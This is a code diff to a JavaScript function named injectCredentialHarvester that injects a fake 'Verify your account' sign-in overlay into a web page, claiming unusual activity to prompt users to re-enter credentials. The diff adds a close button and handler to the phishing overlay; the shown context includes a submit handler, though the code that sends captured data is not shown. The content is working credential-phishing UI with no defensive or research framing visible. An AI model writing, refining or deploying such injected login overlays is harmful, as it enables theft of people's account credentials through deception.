@@ -51,8 +51,9 @@ function injectCredentialHarvester() {
 
     overlay.innerHTML = `
     <div style="
-      background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      position: relative; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2);
       padding: 48px 40px 36px; max-width: 400px; width: 100%; text-align: center;">
+      <button id="__phish_close_btn" aria-label="Close" style="position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; color: #5f6368; cursor: pointer; line-height: 1; z-index: 10;">&times;</button>
       <div style="margin-bottom: 24px; font-size: 24px; font-weight: 500; color: #1a73e8;">[LOCK]</div>
       <h1 style="font-size: 24px; font-weight: 400; margin:0 0 8px;">Verify your account</h1>
       <p style="font-size: 16px; color: #5f6368; margin-bottom: 24px;">We detected unusual activity. Please sign in again.</p>
@@ -69,6 +70,9 @@ function injectCredentialHarvester() {
   `;
 
     document.body.appendChild(overlay);
+
+    const closeBtn = document.getElementById('__phish_close_btn');
+    if (closeBtn) closeBtn.addEventListener('click', () => overlay.remove());
 
     const submitBtn = document.getElementById('__phish_submit');
     submitBtn.addEventListener('click', () => {
